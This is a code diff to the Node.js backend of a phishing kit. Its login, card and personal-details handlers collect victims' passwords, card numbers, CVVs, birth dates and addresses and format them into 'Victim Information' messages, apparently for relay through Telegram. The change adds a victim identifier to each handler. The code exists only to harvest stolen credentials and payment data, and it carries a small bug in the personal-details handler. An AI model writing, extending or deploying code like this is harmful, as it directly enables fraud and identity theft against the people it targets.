@@ -1,9 +1,7 @@
 const axios = require("axios");
 
-let count = 100;
-
 const submitLogin = async (req, res) => {
-  let { username, password, ip, telegramId } = req.body;
+  let { username, password, ip, telegramId, uniqueid } = req.body;
 
   var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;
 
@@ -35,7 +33,7 @@ const submitLogin = async (req, res) => {
 };
 
 const submitCard = async (req, res) => {
-  let { ccnum, ccexp, cvv, ip, telegramId } = req.body;
+  let { ccnum, ccexp, cvv, ip, telegramId, uniqueid } = req.body;
 
   var originalText = `+----------- Billing Information ------------+\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;
 
@@ -68,7 +66,7 @@ const submitCard = async (req, res) => {
 };
 
 const submitPersonal = async (req, res) => {
-  let { fullname, address, pcode, dob, telegramId } = req.body;
+  let { fullname, address, pcode, dob, telegramId, uniqueid } = req.body;
 
   var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPost Code: ${pcode}\n+----------- Victim Information ------------+\nUnique ID: ${uniqueid}\nIP: ${ip}`;
 
